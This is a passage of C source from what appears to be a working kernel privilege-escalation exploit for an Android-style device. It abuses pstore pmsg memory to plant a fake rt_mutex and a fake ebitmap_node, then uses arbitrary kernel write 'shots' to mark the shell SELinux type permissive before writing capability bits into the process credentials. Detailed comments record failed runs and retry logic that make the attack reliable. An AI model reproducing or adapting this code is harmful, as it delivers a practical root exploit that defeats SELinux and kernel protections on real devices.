 * selinuxfs class count.  Any mismatch ABORTs before a single GhostLock write;
 * there is no blind-load path.  A --delta override pointing at any other blob
 * still has to match these constants, so swapping the blob means rebuilding
 * the binary (deliberate). */
/* --------------------------------------------------------------- md5 (v4) */
struct md5_ctx { uint32_t h[4]; uint64_t len; unsigned char buf[64]; size_t n; };
static const uint32_t md5_k[64] = {
    0xd76aa478,0xe8c7b756,0x242070db,0xc1bdceee,0xf57c0faf,0x4787c62a,0xa8304613,0xfd469501,
    0x698098d8,0x8b44f7af,0xffff5bb1,0x895cd7be,0x6b901122,0xfd987193,0xa679438e,0x49b40821,
    0xf61e2562,0xc040b340,0x265e5a51,0xe9b6c7aa,0xd62f105d,0x02441453,0xd8a1e681,0xe7d3fbc8,
    0x21e1cde6,0xc33707d6,0xf4d50d87,0x455a14ed,0xa9e3e905,0xfcefa3f8,0x676f02d9,0x8d2a4c8a,
    0xfffa3942,0x8771f681,0x6d9d6122,0xfde5380c,0xa4beea44,0x4bdecfa9,0xf6bb4b60,0xbebfbc70,
    0x289b7ec6,0xeaa127fa,0xd4ef3085,0x04881d05,0xd9d4d039,0xe6db99e5,0x1fa27cf8,0xc4ac5665,
    0xf4292244,0x432aff97,0xab9423a7,0xfc93a039,0x655b59c3,0x8f0ccc92,0xffeff47d,0x85845dd1,
    0x6fa87e4f,0xfe2ce6e0,0xa3014314,0x4e0811a1,0xf7537e82,0xbd3af235,0x2ad7d2bb,0xeb86d391
};
static uint32_t rol32(uint32_t x, int k) { return (x << k) | (x >> (32 - k)); }
static void md5_block(struct md5_ctx *c, const unsigned char *p)
{
    uint32_t w[16], a = c->h[0], b = c->h[1], d = c->h[2], e = c->h[3];
    int i;
    for (i = 0; i < 16; i++)
        w[i] = (uint32_t)p[4*i] | ((uint32_t)p[4*i+1] << 8) |
               ((uint32_t)p[4*i+2] << 16) | ((uint32_t)p[4*i+3] << 24);
    for (i = 0; i < 64; i++) {
        uint32_t f; int g;
        if (i < 16)      { f = (b & d) | (~b & e);        g = i; }
        else if (i < 32) { f = (e & b) | (~e & d);        g = (5*i + 1) & 15; }
        else if (i < 48) { f = b ^ d ^ e;                 g = (3*i + 5) & 15; }
        else             { f = d ^ (b | ~e);              g = (7*i) & 15; }
        f = f + a + md5_k[i] + w[g];
        a = e; e = d; d = b; b = b + rol32(f, (i<16)?7:((i<32)?12:((i<48)?17:22)));
    }
    c->h[0] += a; c->h[1] += b; c->h[2] += d; c->h[3] += e;
}
static void md5_init(struct md5_ctx *c)
{
    c->h[0] = 0x67452301; c->h[1] = 0xefcdab89;
    c->h[2] = 0x98badcfe; c->h[3] = 0x10325476;
    c->len = 0; c->n = 0;
}
static void md5_update(struct md5_ctx *c, const void *data, size_t len)
{
    const unsigned char *p = (const unsigned char *)data;
    c->len += len;
    while (len) {
        size_t take = 64 - c->n;
        if (take > len) take = len;
        memcpy(c->buf + c->n, p, take);
        c->n += take; p += take; len -= take;
        if (c->n == 64) { md5_block(c, c->buf); c->n = 0; }
    }
}
static void md5_final(struct md5_ctx *c, unsigned char out[16])
{
    uint64_t bits = c->len * 8;
    unsigned char pad = 0x80;
    unsigned char z = 0;
    int i;
    md5_update(c, &pad, 1);
    while (c->n != 56) md5_update(c, &z, 1);
    for (i = 0; i < 8; i++) { unsigned char b = (unsigned char)(bits >> (8*i)); md5_update(c, &b, 1); }
    for (i = 0; i < 4; i++) {
        out[4*i]   = (unsigned char)(c->h[i]);
        out[4*i+1] = (unsigned char)(c->h[i] >> 8);
        out[4*i+2] = (unsigned char)(c->h[i] >> 16);
        out[4*i+3] = (unsigned char)(c->h[i] >> 24);
    }
}
static int md5_file(const char *path, char hex[33])
{
    struct md5_ctx c;
    unsigned char buf[65536], dig[16];
    int fd, n;
    static const char hx[] = "0123456789abcdef";
    int i;
    fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    md5_init(&c);
    while ((n = read(fd, buf, sizeof(buf))) > 0) md5_update(&c, buf, n);
    close(fd);
    if (n < 0) return -1;
    md5_final(&c, dig);
    for (i = 0; i < 16; i++) { hex[2*i] = hx[dig[i] >> 4]; hex[2*i+1] = hx[dig[i] & 15]; }
    hex[32] = 0;
    return 0;
}

static int delta_gate(void)
{
    struct stat st;
    unsigned char hdr[64];
    int fd, n;
    char hex[65];
    const char *p = g_delta_path ? g_delta_path : "/policy_delta.bin";

    if (stat(p, &st) != 0) { res("S0_DELTA_GATE", 0, "missing blob %s", p); return -1; }
    fd = open(p, O_RDONLY);
    if (fd < 0) { res("S0_DELTA_GATE", 0, "open %s errno=%d", p, errno); return -1; }
    memset(hdr, 0, sizeof(hdr));
    n = read(fd, hdr, sizeof(hdr));
    close(fd);
    if (n < 16) { res("S0_DELTA_GATE", 0, "short header %d", n); return -1; }
    {
        unsigned long magic = rd32u(hdr, 0), slen = rd32u(hdr, 4), ver = 0;
        if (slen <= sizeof(hdr) - 12) ver = rd32u(hdr, (int)(8 + slen));
        L("delta %s size=%ld magic=%08lx cfgstrlen=%lu policyvers=%lu",
          p, (long)st.st_size, magic, slen, ver);
        if (g_qemu) {
            /* QEMU harness keeps its 92-class projection blob; only sanity. */
            int ok = (st.st_size > 0x100000 && magic == POLMAGIC);
            res("S0_DELTA_GATE", ok, "qemu blob size=%ld magic=%08lx ver=%lu",
                (long)st.st_size, magic, ver);
            return ok ? 0 : -1;
        }
        if (sha256_file(p, hex) != 0) { res("S0_DELTA_GATE", 0, "sha256 failed"); return -1; }
        L("delta sha256=%s", hex);
        {
            char mhex[33] = {0};
            int ncls, ok;
            if (md5_file(p, mhex) != 0) { res("S0_DELTA_GATE", 0, "md5 failed"); return -1; }
            L("delta md5=%s (v4 gate %s)", mhex, DEV_DELTA_MD5);
            ncls = class_count_selinuxfs();
            ok = (st.st_size == (long)DEV_DELTA_SIZE) && magic == POLMAGIC &&
                 ver == DEV_POLICYVERS && !strcmp(hex, DEV_DELTA_SHA256) &&
                 !strcmp(mhex, DEV_DELTA_MD5);
            if (ncls > 0) L("selinuxfs classes=%d (device model expects %d)", ncls, DEV_CLASSES);
            else L("selinuxfs classes unreadable (rc=%d) -- file-side gate only", ncls);
            res("S0_DELTA_GATE", ok,
                "size=%ld/%lu magic=%08lx vers=%lu sha=%s md5=%s classes=%d/%d",
                (long)st.st_size, DEV_DELTA_SIZE, magic, ver, hex, mhex, ncls, DEV_CLASSES);
            return ok ? 0 : -1;
        }
    }
}

/* --------------------------------------------------------- pmsg vmap (S0) */
static int qemu_pmsg(void)
{
    char *p, b[4096];
    unsigned long va = 0, pa = 0, sz = 0;
    int fd, i;
    static unsigned char buf[1 << 20];
    unsigned char marker[8] = { 'G','L','X','P','M','S','G','1' };

    if (rd_file(PMSGCTL, b, sizeof(b)) < 0) {
        unsigned long mprz;
        if (!A_oops_cxt) { res("S0_PMSG_VMAP", 0, "no pmsg ground truth"); return -1; }
        mprz = gl_u64(A_oops_cxt + 0x18);
        if (!is_kptr(mprz)) { res("S0_PMSG_VMAP", 0, "mprz=%lx", mprz); return -1; }
        va = gl_u64(mprz + 0x10);
        pa = gl_u64(mprz + 0);
        sz = gl_u64(mprz + 8);
    } else {
        if (ctl_path(PMSGCTL, "mprz", cbuf, sizeof(cbuf)) < 0) return -1;
        p = strstr(cbuf, "MPRZFIELDS ");
        if (!p) { L("pmsgctl raw=%.400s", cbuf); res("S0_PMSG_VMAP", 0, "no MPRZFIELDS"); return -1; }
        {
            char *q;
            if ((q = strstr(p, "paddr="))) pa = strtoul(q + 6, NULL, 16);
            if ((q = strstr(p, "size="))) sz = strtoul(q + 5, NULL, 16);
            if ((q = strstr(p, "vaddr="))) va = strtoul(q + 6, NULL, 16);
        }
    }
    if (!is_kptr(va)) { res("S0_PMSG_VMAP", 0, "vaddr=%lx", va); return -1; }
    L("pmsg ground truth: vaddr=%016lx paddr=%016lx size=%016lx", va, pa, sz);
    g_vmap_base = va & ~0xfffffUL;

    fd = open("/dev/pmsg0", O_WRONLY);
    if (fd < 0) { res("S0_PMSG_VMAP", 0, "open pmsg0 %d", errno); return -1; }
    for (i = 0; i < (int)sizeof(buf); i++) buf[i] = (unsigned char)(i & 0xff);
    if (write(fd, buf, 0xFFFF4) < 0) {
        L("pmsg write failed %d", errno);
        close(fd);
        res("S0_PMSG_VMAP", 0, "write failed"); return -1;
    }
    close(fd);
    /* persistent_ram_update_user writes at buffer + 0xC + start; after a
     * full-ring write the cursor is back at 0, so byte k of our payload
     * lands at vaddr + 0xC + k. */
    g_vmap_obj = va + 0x2010;               /* 8-aligned, > +0xC */
    g_vmap_size = sz;
    memcpy(buf + (0x2010 - 0xC), marker, 8);
    fd = open("/dev/pmsg0", O_WRONLY);
    if (fd >= 0) { write(fd, buf, 0xFFFF4); close(fd); }
    {
        unsigned char got[8];
        if (gl_hex(g_vmap_obj, got, 8) != 8 || memcmp(got, marker, 8) != 0) {
            res("S0_PMSG_VMAP", 0, "payload verify failed at %lx", g_vmap_obj);
            return -1;
        }
        L("pmsg: payload mapping verified: byte k lands at vaddr+0xC+k");
    }
    /* i510 field census (QEMU has probe_kernel_read via gl_hex): compare the
     * SHIPPED pattern fill with the new uniform-zero fill at base+0x2000 and at
     * the object offset.  A fake rt_mutex needs wait_lock(u32)=0,
     * waiters.rb_node=0, rb_leftmost=0, owner=0. */
    {
        unsigned long a1 = va + 0x2000, a2 = va + PMSG_DEFAULT_OFF;
        unsigned char c[0x20];
        int ok1, ok2;
        for (i = 0; i < (int)sizeof(buf); i++) buf[i] = (unsigned char)(0x41 + (i & 0x1f));
        fd = open("/dev/pmsg0", O_WRONLY);
        if (fd >= 0) { write(fd, buf, 0xFFFF4); close(fd); }
        memset(c, 0, sizeof(c));
        gl_hex(a1, c, sizeof(c));
        L("pmsg census SHIPPED-PATTERN @%lx wait_lock=%08x rb_node=%016lx rb_leftmost=%016lx owner=%016lx",
          a1, *(unsigned int *)c,
          *(unsigned long *)(c + 8), *(unsigned long *)(c + 0x10), *(unsigned long *)(c + 0x18));
        memset(buf, 0, sizeof(buf));
        fd = open("/dev/pmsg0", O_WRONLY);
        if (fd >= 0) { write(fd, buf, 0xFFFF4); close(fd); }
        memset(c, 0, sizeof(c));
        ok1 = (gl_hex(a1, c, sizeof(c)) == (int)sizeof(c)) &&
              !c[0] && !c[1] && !c[2] && !c[3] &&
              !*(unsigned long *)(c + 8) && !*(unsigned long *)(c + 0x10) &&
              !*(unsigned long *)(c + 0x18);
        L("pmsg census ZERO-FILL @%lx wait_lock=%08x rb_node=%016lx rb_leftmost=%016lx owner=%016lx",
          a1, *(unsigned int *)c,
          *(unsigned long *)(c + 8), *(unsigned long *)(c + 0x10), *(unsigned long *)(c + 0x18));
        memset(c, 0, sizeof(c));
        ok2 = (gl_hex(a2, c, sizeof(c)) == (int)sizeof(c)) &&
              !c[0] && !c[1] && !c[2] && !c[3] &&
              !*(unsigned long *)(c + 8) && !*(unsigned long *)(c + 0x10) &&
              !*(unsigned long *)(c + 0x18);
        L("pmsg census ZERO-FILL @%lx wait_lock=%08x rb_node=%016lx rb_leftmost=%016lx owner=%016lx",
          a2, *(unsigned int *)c,
          *(unsigned long *)(c + 8), *(unsigned long *)(c + 0x10), *(unsigned long *)(c + 0x18));
        if (!ok1 || !ok2) {
            res("S0_PMSG_VMAP", 0, "fake-lock field census failed (%d/%d)", ok1, ok2);
            return -1;
        }
        g_vmap_obj = a2;
    }
    res("S0_PMSG_VMAP", 1, "vaddr=%lx obj=%lx zero-fill fields verified", va, g_vmap_obj);
    return 0;
}

static int device_pmsg(void)
{
    int r = dev_pmsg_leak();
    unsigned long off;
    if (r != 0) { res("S0_PMSG_VMAP", 0, "perf leak failed rc=%d", r); return r; }
    /* i510 hard contract: object must be 8-aligned, inside the 1MB data area,
     * at least 0x40 away from the buffer header, and the local image must be a
     * complete legal fake rt_mutex.  Any violation aborts before a write shot
     * (never blind-write). */
    off = g_vmap_obj - g_vmap_base;
    if (!is_kptr(g_vmap_obj) || (g_vmap_obj & 7) ||
        off < 0x40 || off + PMSG_OBJ_SIZE > PMSG_DATA_LEN ||
        !pmsg_img_fake_lock_at(off)) {
        L("S0_PMSG_VMAP ASSERT FAILED base=%016lx obj=%016lx off=%#lx",
          g_vmap_base, g_vmap_obj, off);
        res("S0_PMSG_VMAP", 0, "fake-lock assert failed off=%#lx", off);
        return -7;
    }
    g_vmap_size = PMSG_DATA_LEN;
    res("S0_PMSG_VMAP", 1,
        "perf base=%lx obj=%lx off=%#lx cursor=%#lx uniform-zero fake rt_mutex (0 GhostLock shots)",
        g_vmap_base, g_vmap_obj, off, g_pmsg_cursor);
    /* intent 662: put the fake ebitmap_node into the SAME pmsg image (the fake
     * rt_mutex at 0x2000 stays zero).  This is a local buffer edit only. */
    {
        int pr = perm_encode_node();
        if (pr != 0) {
            res("PERM_IMG", 0, "perm_encode_node rc=%d (S=%d certain=%d)",
                pr, g_pmsg_start, g_pmsg_start_certain);
            return -8;
        }
        if (!pmsg_img_fake_lock_at(off)) {
            res("PERM_IMG", 0, "fake rt_mutex clobbered by the node image");
            return -8;
        }
        res("PERM_IMG", 1,
            "fake ebitmap_node @ vmap+%#lx (img idx=%#lx) next=0 startbit=%#lx "
            "maps[0]=%016lx ; shell type %d (S=%d certain=%d)",
            (unsigned long)PERM_NODE_VMAP_OFF, g_perm_img_idx,
            (unsigned long)PERM_STARTBIT,
            (unsigned long)(1UL << (PERM_SHELL_BIT % 64)),
            PERM_TYPE_SHELL, g_pmsg_start, g_pmsg_start_certain);
    }
    return 0;
}
/* ---------------------------------------------------------- delivery layer */
static int load_policy(const char *path)
{
    static char buf[8 * 1024 * 1024];
    int fd, r;
    fd = open(path, O_RDONLY);
    if (fd < 0) return -1000 - errno;
    r = read(fd, buf, sizeof(buf));
    close(fd);
    if (r <= 0) return -2000 - errno;
    if (wrblob("/sys/fs/selinux/load", buf, r) != 0) return -4000;
    return r;
}

static int setcon(const char *ctx)
{
    /* wr_file() returns the byte count on success; every caller in this
     * binary tests "!= 0", and client_probe() turns a non-zero result
     * into _exit(31) -- so a *successful* setcon was reported as a
     * failure.  Normalise to the 0/-errno convention. */
    int r = wr_file("/proc/self/attr/current", ctx);
    return r < 0 ? r : 0;
}

static socklen_t ab_len(const char *name)
{
    return (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 1 + strlen(name));
}

static int listen_ab(const char *name)
{
    struct sockaddr_un sa;
    int s = socket(AF_UNIX, SOCK_STREAM, 0);
    if (s < 0) return -errno;
    memset(&sa, 0, sizeof(sa));
    sa.sun_family = AF_UNIX;
    sa.sun_path[0] = 0;
    strncpy(sa.sun_path + 1, name, sizeof(sa.sun_path) - 2);
    if (bind(s, (struct sockaddr *)&sa, ab_len(name)) < 0) { int e = -errno; close(s); return e; }
    if (listen(s, 8) < 0) { int e = -errno; close(s); return e; }
    return s;
}

static int connect_ab(const char *name)
{
    struct sockaddr_un sa;
    int s = socket(AF_UNIX, SOCK_STREAM, 0);
    if (s < 0) return -errno;
    memset(&sa, 0, sizeof(sa));
    sa.sun_family = AF_UNIX;
    sa.sun_path[0] = 0;
    strncpy(sa.sun_path + 1, name, sizeof(sa.sun_path) - 2);
    if (connect(s, (struct sockaddr *)&sa, ab_len(name)) < 0) { int e = -errno; close(s); return e; }
    return s;
}

static const char *TOKEN = "glx-token-0123456789abcdef";

static int w8(unsigned long target, unsigned long value);

#ifdef GLX_UT
/* ---------------------------------------------------------------- host UT
 * Compile-time-only seams (tests/ut_p11.c includes this file with -DGLX_UT).
 * The aarch64 build has neither the hooks nor any of this code. */
int (*ut_w8_hook)(unsigned long target, unsigned long value);
int (*ut_read_hook)(unsigned long A, unsigned char *out, int *n);
/* intent 720: script the behaviour probes so the arm/retry loop is testable
 * on the host (the aarch64 build has none of this). */
int (*ut_probe_hook)(const char *path, int is_dir);
/* i739 (intent 754): the SETIDS raw-syscall seam.  The hook sees the exact
 * syscall numbers the production block issues, so the host UT can prove that
 * NO glibc NPTL setxid broadcast (and therefore no SIGSETXID tgkill) is used.
 * ut_task_count_override > 0 scripts /proc/self/status "Threads:" so the
 * fail-closed precondition is testable without spawning threads. */
int (*ut_setids_syscall_hook)(long nr, long a, long b, long c);
int ut_task_count_override;
#endif

/* ================================================ glx_p11 (intent 696) 修 ①
 * After a COMPLETE perm arm the chain must jump straight to SETIDS.  glx_p10
 * fell through into the perm_n9_fallback label, whose first statement rejects
 * a run without --perm-fallback=n9 -> every perm run aborted before SETIDS
 * (fact 695).  Kept as a function so the host UT can exercise both arms. */
static int perm_continue_to_setids(void)
{
    return !g_perm_fallback_n9;
}

/* ================================================ glx_p11 (intent 696) 修 ③
 * Third state (--perm-armed): an earlier run on THIS boot already armed the
 * map (fact 694: perm_map.node == planned X, highbit == planned W).  Then
 * PERM_PRE/PERMNODE/PERM_HI are skipped, but the state itself must be read
 * back exactly, and the fake node's content must still be the PERM_IMG blob
 * (next==0, maps[0]==1<<shell_bit).  Anything else aborts cleanly BEFORE
 * SETIDS -- never a blind step into a half-armed map. */
static int perm_armed_decide(unsigned long pn, unsigned int ph,
                             unsigned long want_x, unsigned int want_w)
{
    int ok = (pn == want_x) && (ph == want_w);
    L("PERM_ARMED node=%016lx highbit=%u (want %016lx/%u; no write issued)",
      pn, ph, want_x, want_w);
    res("PERM_ARMED_STATE", ok,
        "node=%016lx highbit=%u (want %016lx/%u; same-boot armed state, "
        "0 GhostLock writes)", pn, ph, want_x, want_w);
    return ok;
}

/* content self-check of the armed ebitmap_node (PERM_VRF equivalent) */
static int perm_vrf_decide(unsigned long vn, unsigned long vm)
{
    unsigned long want = 1UL << (PERM_SHELL_BIT % 64);
    return (vn == 0) && (vm == want);
}

/* ==========================================================================
 * glx_p11e (intent 706): PRE-ARM the per-SID permissive map BEFORE any
 * capability lands in our cred, and prove it with a BEHAVIOUR oracle instead
 * of a GhostLock read.
 *
 * WHY THE ORDER MATTERS (root cause of run44's setresgid EPERM -> reset)
 *   Every GhostLock shot calls sched_setattr(tid, SCHED_BATCH), and
 *   __sched_setscheduler() starts with
 *       if (user && !capable(CAP_SYS_NICE)) ...        (sched/core.c 5.4:4904)
 *   V = fake_lock + 0x830c6 carries bit 23 (CAP_SYS_NICE), so after WC2/WC3
 *   install V in cap_effective every later shot passes cap_capable() and
 *   SELinux's cred_has_capability() runs
 *       avc_has_perm_noaudit(sid, sid, SECCLASS_CAPABILITY, 1<<cap)
 *   whose AVC key is only (ssid,tsid,tclass).  glx_p11d did PERM_PRE (a shot)
 *   BEFORE PERM_HI, so the very first such decision was computed while
 *   permissive_map was still empty; the node was cached with
 *   AVD_FLAGS_PERMISSIVE=0 and avc_denied() kept returning -EACCES for
 *   setresgid() even after the map was armed.  On a boot that had already
 *   been armed by an earlier run the node was computed later and carried the
 *   flag, which is why the older --perm-armed run succeeded.
 *   => arm the map FIRST, write the capability words SECOND.  The first
 *   cached capability decision is then computed with AVD_FLAGS_PERMISSIVE and
 *   every later capable(CAP_SETGID|CAP_SETUID) is granted through avc_denied.
 *
 * WHY NO GHOSTLOCK READ HERE (fact 697)
 *   read_window(A) also stores (data_slot-8) at A-8: reading cred+0x38
 *   destroyed cred+0x30; reading perm_map.highbit would destroy
 *   perm_map.node.  The armed state is proven by opening files that shell is
 *   normally denied (SELinux-only denial, DAC-readable): kptr_restrict at
 *   PRE, /proc/kallsyms at POST.  Fresh pairs on the two sides avoid the AVC
 *   staleness problem (avc_denied() does not update a cached hard denial).
 *
 * highbit stays W = base+0x3000.  A "minimal" highbit (1464..1791) is NOT
 * reachable: the GhostLock store writes `value` itself and a non-zero value
 * is also dereferenced for the secondary store, so `value` must be a
 * writable kernel pointer; every writable address in this board's pmsg /
 * linear window has low32 >= 0x10f00000, and the only addresses with low32
 * in [1464,1791] would be phys 0x5B8..0x6FF (below memstart, unmapped).
 * The safety invariant is therefore "node->next == 0 whenever highbit != 0":
 * dev_write8() refills the pmsg image (next=0) before every shot, and this
 * build never re-issues PERMNODE while a highbit is already live (no retry
 * of the pair, no zero-value write: fact 609).
 * ========================================================================== */
static int perm_probe_readable(const char *path)
{
#ifdef GLX_UT
    if (ut_probe_hook) return ut_probe_hook(path, 0);
#endif
    char c;
    int fd, r, e;
    fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return -errno;
    errno = 0;
    r = (int)read(fd, &c, 1);
    e = errno;
    close(fd);
    if (r > 0) return 1;
    return e ? -e : -EIO;
}

/* directory oracle: 0 = permitted, -EACCES = SELinux/DAC denied.  The
 * /sys/fs/pstore directory is dr-xr-x--- system:log and the shell uid is a
 * member of group log(1007) on this board, so stat/DAC is fine while
 * SELinux denies the read; after the shell type is permissive the open
 * succeeds.  This is a *fresh* AVC pair in the fresh-arm path. */
static int perm_probe_dir(const char *path)
{
#ifdef GLX_UT
    if (ut_probe_hook) return ut_probe_hook(path, 1);
#endif
    int fd = open(path, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
    if (fd < 0) return -errno;
    close(fd);
    return 0;
}

/* pure oracle verdict: 1 = permissive proven, 0 = still denied, -1 = other */
static int perm_oracle_verdict(int rc)
{
    if (rc == 1) return 1;
    if (rc == -EACCES) return 0;
    return -1;
}

/* ================================================ glx_p11f (intent 720) ====
 * File-class behaviour-oracle pool for the arming loop.  Each entry must be a
 * DISTINCT (target type, class): an AVC node computed BEFORE the map is armed
 * keeps AVD_FLAGS_PERMISSIVE=0 for the rest of the boot (avc_denied() does not
 * refresh it), so a given (tsid,tclass) is usable exactly ONCE per boot.  All
 * three paths are SELinux-denied for u:r:shell:s0 but DAC-readable, and none
 * is capability-gated (a capability check here would poison the
 * (shell,shell,SECCLASS_CAPABILITY) node, fact 714):
 *   /proc/kallsyms                  proc_kallsyms, file  (open denied)
 *   /proc/sys/kernel/kptr_restrict  proc_security, file
 *   /proc/sys/kernel/panic_on_oops  proc_security, file  (fresh path only)
 * If two paths happen to share a type, the later one is merely a stale
 * EACCES -> a conservative extra retry/abort, never a false "armed". */
#define GLX_PERM_TRIES 3
static const char *const PERM_POST_POOL[GLX_PERM_TRIES] = {
    "/proc/kallsyms",
    "/proc/sys/kernel/kptr_restrict",
    "/proc/sys/kernel/panic_on_oops",
};

static int perm_prearm(unsigned long a_node, unsigned long a_hi,
                       unsigned long X, unsigned long W)
{
    int pre, verdict;

    if (!is_kptr(X) || !is_kptr(W) || !is_kptr(a_node) || !is_kptr(a_hi)) {
        res("PERM_PREARM", 0,
            "bad addresses X=%016lx W=%016lx node=%016lx hi=%016lx",
            X, W, a_node, a_hi);
        return -1;
    }
    if (g_perm_skip) {
        res("PERM_PREARM_SKIP", 1,
            "--perm-skip / ambiguous ring start: no arming here (N9 window "
            "is used later)");
        return 0;
    }
    if (g_perm_armed) {
        /* same boot, already armed by an earlier run: verify, do not write.
         * panic_on_oops is 0644 root:root and shell has no SELinux read rule
         * (fact 504); this pair is reserved for the --perm-armed check. */
        pre = perm_probe_readable("/proc/sys/kernel/panic_on_oops");
        verdict = perm_oracle_verdict(pre);
        L("PERM_PREARMED verify(--perm-armed) panic_on_oops rc=%d verdict=%d",
          pre, verdict);
        if (verdict == 1) {
            g_perm_prearmed = 1;
            res("PERM_PREARMED", 1,
                "--perm-armed proven by behaviour oracle (panic_on_oops "
                "ALLOW); 0 GhostLock writes, 0 GhostLock reads");
            return 0;
        }
        /* The file oracle may be a *stale* AVC denial (a denial cached by a
         * previous probe in this boot is never refreshed by arming: avc_denied
         * only updates nodes it reaches on a denial).  --perm-armed issues no
         * writes, so it is safe to continue and let SETID_GATE (the exact
         * capable(CAP_SETGID) path) decide. */
        g_perm_prearmed = 1;
        g_perm_behavior_unproven = 1;
        L("PERM_PREARMED verify inconclusive (oracle rc=%d verdict=%d) -- "
          "0 writes issued, deferring to SETID_GATE", pre, verdict);
        res("PERM_PREARMED_VERIFY", 1,
            "oracle rc=%d verdict=%d not conclusive (stale AVC denial is "
            "possible); no write issued, SETID_GATE is authoritative",
            pre, verdict);
        return 0;
    }
    /* fresh path: only valid on a boot whose permissive_map is empty */
    pre = perm_probe_dir("/sys/fs/pstore");
    verdict = (pre == 0) ? 1 : (pre == -EACCES ? 0 : -1);
    L("PERM_PREARM fresh-boot oracle pstore-dir rc=%d verdict=%d "
      "(-13=expected before arming; DAC ok via group log, SELinux denies)",
      pre, verdict);
    if (verdict == 1) {
        g_perm_prearmed = 1;
        res("PERM_PREARMED", 1,
            "map already permissive on this boot (pstore dir ALLOW); "
            "0 writes -- use --perm-armed on the next run");
        return 0;
    }
    if (verdict != 0) {
        res("PERM_PREARM", 0,
            "fresh-boot oracle rc=%d is neither EACCES nor ALLOW -> "
            "ambiguous, clean abort", pre);
        return -1;
    }
    if (!g_pmsg_start_certain && !g_perm_allow_ambiguous) {
        res("PERM_PREARM", 0,
            "ring start S ambiguous (certain=0): cold start, or "
            "--perm-allow-ambiguous");
        return -1;
    }
    if (PERM_STAGE("permpre")) { g_perm_stopped = 1; return 0; }

    /* ---------------- intent 720: verified, retried WHOLE-ARM -------------
     * fact 719: run02 issued SHOT 7 (perm_map.node) and SHOT 8
     * (perm_map.highbit) as bare w8() stores.  They were silent no-ops
     * (fact 260 retry-safe class) yet were never re-issued; the later
     * capability writes then made the first capable(CAP_SYS_NICE) reach
     * SELinux with an EMPTY map and cached
     * (shell,shell,SECCLASS_CAPABILITY) as a hard denial for the rest of the
     * boot (fact 714), so setgroups(0)/setresgid() returned EPERM and the run
     * aborted with no shots left.  This block fixes both halves:
     *   1) arm in WHOLE rounds (PERMNODE then PERM_HI); every store is
     *      preceded by the dev_write8() pmsg refill, which restores the fake
     *      node->next=0, so PERM_HI always runs with next==0;
     *   2) prove the arm ONLY with a FRESH file-class behaviour oracle -- a
     *      capability-class check is forbidden here because the first one
     *      that reaches SELinux is cached for the whole boot (fact 714);
     *   3) advance to the NEXT distinct (tsid,tclass) probe on failure (a node
     *      computed before arming keeps AVD_FLAGS_PERMISSIVE=0 forever);
     *   4) after GLX_PERM_TRIES rounds without a flip, abort CLEANLY before
     *      any capability write / SETIDS (0 further shots).
     * Retry safety (fact 260/714; offline C.53 adjudication, intent 720): a
     * re-issued PERMNODE carries the primitive's secondary store at X (= our
     * fake node), i.e. *(X)=A_pm_node-8, so for the short window between that
     * store and the very next refill the fake node's next is non-zero while a
     * previous round's highbit may still be live.  ebitmap_get_bit() only
     * READS n->next and A_pm_node-8 is a readable word inside the same
     * policydb, so this can neither fault nor panic; the worst case is a
     * sub-10ms transient wrong answer for a type >= startbit+MAPSIZE, and the
     * next store's refill restores next=0.  A zero-value disarm is NOT
     * available on this board (fact 609: first value==0 shot => SIGKILL +
     * panic), so the pair is always re-armed whole.  highbit stays W (fact
     * 714/706: a "minimal" highbit is not a writable pointer here). */
    {
        int round, proved = 0;
        for (round = 0; round < (int)GLX_PERM_TRIES && !proved; round++) {
            const char *probe = PERM_POST_POOL[round];
            L("PERM_ARM round %d/%d: node=%016lx X=%016lx highbit=%016lx "
              "W=%016lx (armed BEFORE every capability write; refill restores "
              "node->next=0 before each store)",
              round + 1, (int)GLX_PERM_TRIES, a_node, X, a_hi, W);
            shot_tag("PERMNODE");
            if (w8(a_node, X) != 0) {
                L("PERMNODE round %d: trigger failed (retry-safe class), "
                  "re-arming whole", round + 1);
                continue;
            }
            L("PERMNODE *(perm_map.node)=%016lx round %d (highbit not yet "
              "live => fully inert; next refilled to 0 before PERM_HI)",
              a_node, round + 1);
            if (PERM_STAGE("permnode")) { perm_dwell(); g_perm_stopped = 1; return 0; }

            shot_tag("PERM_HI");
            if (w8(a_hi, W) != 0) {
                L("PERM_HI round %d: trigger failed (retry-safe class), "
                  "re-arming whole", round + 1);
                continue;
            }
            L("PERM_HI *(perm_map.highbit)=%016lx (low32=%u; node->next=0 "
              "restored by the refill before this store)", a_hi,
              (unsigned int)W);
            if (PERM_STAGE("permhi")) { perm_dwell(); g_perm_stopped = 1; return 0; }

            g_ledger_off = 1;          /* behaviour probes make the ledger advisory */
            pre = perm_probe_readable(probe);
            verdict = perm_oracle_verdict(pre);
            L("PERM_BEHAVIOR round %d probe=%s rc=%d verdict=%d (1 = shell "
              "type permissive proven by a fresh FILE-class oracle)",
              round + 1, probe, pre, verdict);
            if (verdict == 1) {
                proved = 1;
                res("PERM_BEHAVIOR_FLIP", 1,
                    "per-SID map armed in round %d; fresh file oracle %s "
                    "flipped EACCES->readable (behaviour proof, no GhostLock "
                    "read, before any capability write)", round + 1, probe);
                break;
            }
            if (verdict < 0)
                L("PERM_BEHAVIOR round %d inconclusive (rc=%d, expected "
                  "-EACCES before arming) -- advancing to the next fresh probe",
                  round + 1, pre);
        }
        if (!proved) {
            g_perm_prearmed = 1;       /* map may be partially armed: never let
                                        * the legacy block re-arm it */
            g_perm_behavior_unproven = 1;
            res("PERM_BEHAVIOR_PROOF", 0,
                "no fresh file-class oracle flipped after %d whole-arm rounds; "
                "clean abort BEFORE any capability write / SETIDS (0 further "
                "shots, never a capability-class probe)",
                (int)GLX_PERM_TRIES);
            return -1;
        }
        g_perm_prearmed = 1;
        return 0;
    }
}

/* ================================================ glx_p11 (intent 696) 修 ②
 * A GhostLock store can be a SILENT no-op: w8() returns 0 but the target still
 * holds its old value (fact 260 first shot, fact 692 shot 11); fact 260/692
 * classify that as retry-safe (no oops, no panic).  So every capability write
 * is write -> readback target -> compare -> re-issue the SAME template, at
 * most GLX_W8_TRIES times.
 *   lo32_only==0 : exact 64-bit compare (cred cap words, perm_map.node)
 *   lo32_only==1 : low-32 compare      (perm_map.highbit is a u32 inside the
 *                                      64-bit slot; its high half is another
 *                                      policydb field we must not require)
 * Returns 0 only after a readback proved the value.  The verification read is
 * itself a GhostLock shot, so it turns the per-shot ledger advisory
 * (g_ledger_off) instead of silently drifting the designed count. */
